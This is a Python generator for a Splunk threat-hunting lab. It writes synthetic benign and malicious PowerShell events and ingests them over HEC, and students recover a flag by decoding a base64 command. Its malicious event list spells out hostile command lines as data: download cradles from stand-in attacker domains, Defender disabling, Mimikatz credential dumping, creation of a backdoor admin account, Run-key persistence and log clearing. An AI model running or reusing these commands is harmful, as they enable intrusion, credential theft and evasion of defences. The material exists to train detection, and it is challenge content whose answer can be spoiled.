#!/usr/bin/env python3
"""
Data-forge de Poltergeist — genera un dataset de actividad PowerShell (benigna
y maliciosa) y lo ingesta en Splunk vía HEC (índice 'northwind').

Es un lab de caza de amenazas y detection engineering sobre abuso de PowerShell
en la flota Windows de Northwind Global Systems: comandos codificados, download
cradles, ventana oculta, evasión de defensas (AV / borrado de logs), acceso a
credenciales, persistencia y descubrimiento — escondidos entre PowerShell
legítimo. El alumno los caza con SPL y recupera la flag decodificando un
comando ofuscado.

Cada evento se emite como Sysmon EventID=1 (creación de proceso) y, para los
comandos, también como PowerShell Script Block Logging (EventID 4104). Los
eventos con red generan además Sysmon EventID=3.

Todo es SINTÉTICO y REPRODUCIBLE (seed fija). La flag se incrusta en un
-EncodedCommand (base64). En el repo, /seed/flag.txt es un DECOY; el valor real
se inyecta en el build de CI desde un secret.
"""
import base64
import json
import os
import random
import time
import urllib.error
import urllib.request

HEC_URL = os.environ.get("HEC_URL", "https://splunk:8088/services/collector/event")
HEC_TOKEN = os.environ.get("HEC_TOKEN", "00000000-0000-0000-0000-000000000000")
INDEX = os.environ.get("SPLUNK_INDEX", "northwind")
SEED = int(os.environ.get("FORGE_SEED", "4104"))
MGMT_URL = os.environ.get("SPLUNK_MGMT_URL", "https://splunk:8089")
SPLUNK_USER = os.environ.get("SPLUNK_USER", "admin")
SPLUNK_PASSWORD = os.environ.get("SPLUNK_PASSWORD", "Changeme123!")


def _load_flag():
    v = os.environ.get("POLTERGEIST_FLAG")
    if v:
        return v.strip()
    try:
        with open("/seed/flag.txt", "r", encoding="utf-8") as fh:
            return fh.read().strip()
    except OSError:
        return "NORTHWIND{th15_15_n0t_th3_r34l_fl4g}"


FLAG = _load_flag()
rng = random.Random(SEED)

DOMAIN = "NWGLOBAL"
USERS = ["nancy.davolio", "a.fuller", "j.leverling", "m.peacock", "s.buchanan",
         "m.suyama", "r.king", "l.callahan"]
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

T0 = time.time() - 3600           # la actividad ocurrió en la última hora
events = []


def b64(s):
    return base64.b64encode(s.encode()).decode()


def add(sourcetype, ts, fields):
    events.append({
        "time": round(ts, 3),
        "host": fields.get("Computer", "NW-WKS"),
        "source": "northwind:forge",
        "sourcetype": sourcetype,
        "index": INDEX,
        "event": fields,
    })


def emit(ts, host, user, parent, cmdline, technique, severity, action,
         dest_ip="", dest_port=0, event_type=""):
    """Emite Sysmon EventID=1 + PowerShell 4104 (+ Sysmon 3 si hay red)."""
    parent_img = parent if "\\" in parent else rf"C:\Windows\System32\{parent}"
    add("Sysmon", ts, {
        "EventID": 1, "Computer": host, "User": f"{DOMAIN}\\{user}",
        "Image": PS, "ParentImage": parent_img,
        "CommandLine": cmdline, "ProcessId": rng.randint(2000, 9000),
        "mitre_technique": technique, "severity": severity, "action": action,
        "event_type": event_type,
    })
    add("WinEventLog:Microsoft-Windows-PowerShell/Operational", ts + 0.2, {
        "EventCode": 4104, "Computer": host, "User": f"{DOMAIN}\\{user}",
        "ScriptBlockText": cmdline,
    })
    if dest_ip and dest_ip != "0.0.0.0":
        add("Sysmon", ts + 0.4, {
            "EventID": 3, "Computer": host, "User": f"{DOMAIN}\\{user}",
            "Image": PS, "DestinationIp": dest_ip, "DestinationPort": dest_port,
            "Protocol": "tcp",
        })


# ── Actividad benigna de fondo (PowerShell legítimo) ─────────────────────────
BENIGN = [
    "powershell.exe Get-Process", "powershell.exe Get-Service",
    "powershell.exe Get-ChildItem C:\\Users", "powershell.exe Get-EventLog System -Newest 20",
    "powershell.exe Test-NetConnection intranet.northwind-systems.com",
    "powershell.exe Get-ComputerInfo", "powershell.exe Get-LocalUser",
    "powershell.exe Import-Module ActiveDirectory", "powershell.exe Get-Date",
    "powershell.exe Update-Help", "powershell.exe Get-NetTCPConnection",
]


def forge_benign():
    for _ in range(90):
        ts = T0 + rng.uniform(0, 3300)
        emit(ts, f"NW-WKS-{rng.randint(1,60):03d}", rng.choice(USERS),
             "explorer.exe", rng.choice(BENIGN), "T1059.001", "Low", "Allowed",
             event_type="Benign Command")


# ── Actividad maliciosa (lista fija => recuentos deterministas) ──────────────
# (host, user, parent, cmdline, technique, severity, action, dest_ip, dest_port, event_type)
MAL = [
    ("NW-WKS-014", "s.buchanan", "winword.exe",
     "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIABEAG8AdwBuAGwA",
     "T1059.001", "Critical", "Blocked", "45.83.220.17", 443, "Encoded PowerShell"),
    ("NW-WKS-014", "s.buchanan", "winword.exe",
     "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://cdn-edge-sync.net/stage.ps1')",
     "T1105", "Critical", "Blocked", "45.83.220.17", 80, "Download Cradle"),
    ("NW-WKS-021", "m.peacock", "excel.exe",
     "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File invoice_Q3.ps1",
     "T1059.001", "High", "Detected", "203.0.113.150", 445, "Hidden Window"),
    ("NW-WKS-021", "m.peacock", "excel.exe",
     "powershell.exe Invoke-WebRequest http://update-svc-cdn.net/dropper.exe -OutFile %TEMP%\\d.exe",
     "T1105", "High", "Blocked", "193.32.162.90", 80, "Invoke-WebRequest"),
    ("NW-WKS-007", "r.king", "outlook.exe",
     "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://update-svc-cdn.net/a.ps1')",
     "T1027", "Critical", "Blocked", "104.248.22.10", 443, "Suspicious Execution"),
    ("NW-WKS-031", "m.suyama", "mshta.exe",
     "powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
     "T1027", "Critical", "Blocked", "198.54.117.12", 443, "Encoded PowerShell"),
    ("NW-WKS-013", "j.leverling", "services.exe",
     "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
     "T1562.001", "Critical", "Blocked", "", 0, "Defense Evasion"),
    ("NW-WKS-013", "j.leverling", "cmd.exe",
     "powershell.exe Add-MpPreference -ExclusionPath C:\\Users\\Public",
     "T1562.001", "Critical", "Blocked", "", 0, "Defense Evasion"),
    ("NW-WKS-002", "nancy.davolio", "powershell.exe",
     "powershell.exe Invoke-Mimikatz -DumpCreds",
     "T1003", "Critical", "Blocked", "", 0, "Credential Access"),
    ("NW-WKS-045", "a.fuller", "taskeng.exe",
     "powershell.exe New-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Updater",
     "T1547.001", "High", "Detected", "", 0, "Persistence"),
    ("NW-WKS-045", "a.fuller", "cmd.exe",
     "powershell.exe net user support P@ssw0rd123 /add",
     "T1136", "High", "Detected", "", 0, "Account Creation"),
    ("NW-WKS-045", "a.fuller", "cmd.exe",
     "powershell.exe net localgroup administrators support /add",
     "T1098", "Critical", "Blocked", "", 0, "Privilege Escalation"),
    ("NW-WKS-050", "l.callahan", "chrome.exe",
     "powershell.exe iwr http://cdn-edge-sync.net/loader.ps1 | iex",
     "T1105", "Critical", "Blocked", "45.83.220.17", 8080, "Download Cradle"),
    ("NW-WKS-007", "r.king", "powershell.exe",
     "powershell.exe wevtutil cl Security",
     "T1070.001", "Critical", "Blocked", "", 0, "Log Clearing"),
    ("NW-WKS-007", "r.king", "powershell.exe",
     "powershell.exe Clear-EventLog -LogName Security",
     "T1070.001", "Critical", "Blocked", "", 0, "Log Clearing"),
    ("NW-WKS-031", "m.suyama", "mshta.exe",
     "powershell.exe Start-BitsTransfer http://update-svc-cdn.net/tool.exe -Destination %TEMP%\\t.exe",
     "T1197", "High", "Blocked", "185.244.25.44", 443, "BITS Download"),
    ("NW-WKS-002", "nancy.davolio", "wmiprvse.exe",
     "powershell.exe whoami /all; net group \"Domain Admins\" /domain",
     "T1087", "Medium", "Detected", "", 0, "Discovery"),
    ("NW-WKS-050", "l.callahan", "outlook.exe",
     "powershell.exe curl http://malicious-download.net/tool.exe -o t.exe",
     "T1105", "High", "Blocked", "198.51.100.99", 80, "Download Cradle"),
    ("NW-WKS-021", "m.peacock", "excel.exe",
     "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAA=",
     "T1027", "High", "Blocked", "203.0.113.201", 80, "Encoded PowerShell"),
    ("NW-WKS-014", "s.buchanan", "powershell.exe",
     "powershell.exe -NoP -W Hidden -C Start-Process powershell -ArgumentList '-enc SQBFAFgA'",
     "T1059.001", "High", "Blocked", "198.51.100.88", 443, "Process Spawn"),
]


def forge_malicious():
    base = T0 + 300
    for i, row in enumerate(MAL):
        host, user, parent, cmd, tech, sev, act, dip, dport, et = row
        emit(base + i * 45, host, user, parent, cmd, tech, sev, act, dip, dport, et)

    # ── Evento con la FLAG: -EncodedCommand cuyo base64 decodifica a la flag ──
    flag_script = f"$note='operator';Write-Output '{FLAG}'"
    enc = b64(flag_script)
    emit(base + len(MAL) * 45 + 30, "NW-WKS-014", "s.buchanan", "winword.exe",
         f"powershell.exe -NoProfile -EncodedCommand {enc}",
         "T1027", "Critical", "Blocked", "45.83.220.17", 443, "Encoded PowerShell")


# ── Ingesta HEC (mismo patrón que Overwatch) ─────────────────────────────────
def _ssl_ctx():
    import ssl
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


def _auth_header():
    tok = base64.b64encode(f"{SPLUNK_USER}:{SPLUNK_PASSWORD}".encode()).decode()
    return {"Authorization": f"Basic {tok}"}


def ensure_index(retries=60):
    url = f"{MGMT_URL}/services/data/indexes"
    ctx = _ssl_ctx()
    for _ in range(retries):
        try:
            req = urllib.request.Request(url, data=f"name={INDEX}".encode(), headers=_auth_header())
            urllib.request.urlopen(req, timeout=8, context=ctx).read()
            print(f"[forge] índice '{INDEX}' creado.", flush=True)
            return
        except urllib.error.HTTPError as e:
            if e.code == 409:
                print(f"[forge] índice '{INDEX}' ya existe.", flush=True)
                return
            time.sleep(3)
        except Exception:
            time.sleep(3)
    raise SystemExit("[forge] no pude crear el índice (splunkd no respondió)")


def wait_for_hec(retries=60):
    health = HEC_URL.replace("/services/collector/event", "/services/collector/health")
    ctx = _ssl_ctx()
    for _ in range(retries):
        try:
            urllib.request.urlopen(urllib.request.Request(health), timeout=4, context=ctx)
            return
        except urllib.error.HTTPError as e:
            if e.code in (200, 400):
                return
            time.sleep(3)
        except Exception:
            time.sleep(3)
    raise SystemExit("[forge] HEC no respondió a tiempo")


def ship(batch):
    body = "\n".join(json.dumps(e) for e in batch).encode()
    req = urllib.request.Request(
        HEC_URL, data=body,
        headers={"Authorization": f"Splunk {HEC_TOKEN}", "Content-Type": "application/json"},
    )
    urllib.request.urlopen(req, timeout=20, context=_ssl_ctx()).read()


def main():
    print(f"[forge] generando dataset PowerShell (seed={SEED}) ...", flush=True)
    forge_benign()
    forge_malicious()
    events.sort(key=lambda e: e["time"])
    print(f"[forge] {len(events)} eventos generados. Preparando Splunk...", flush=True)
    ensure_index()
    wait_for_hec()
    print("[forge] HEC listo. Ingestando...", flush=True)
    for i in range(0, len(events), 200):
        ship(events[i:i + 200])
    print(f"[forge] ingesta completada: {len(events)} eventos en index={INDEX}.", flush=True)
    with open("/tmp/forge_done", "w") as fh:
        fh.write(str(len(events)))


if __name__ == "__main__":
    main()
